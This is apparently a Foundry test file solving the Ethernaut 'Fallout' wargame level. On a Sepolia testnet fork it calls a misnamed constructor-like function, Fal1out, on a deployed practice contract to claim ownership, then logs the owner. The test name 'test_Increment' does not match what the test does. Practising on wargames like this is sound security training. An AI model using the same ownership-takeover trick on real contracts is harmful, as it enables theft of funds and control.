// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout public fallout;

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6599343);
    }

    function test_Increment() public {
        Fallout fallout = Fallout(0x6F68383141902ff62aCbF8690D7Aa1E8e0F91827);
        fallout.Fal1out{value: 0.1 ether}();

        console.log(fallout.owner());
    }

}
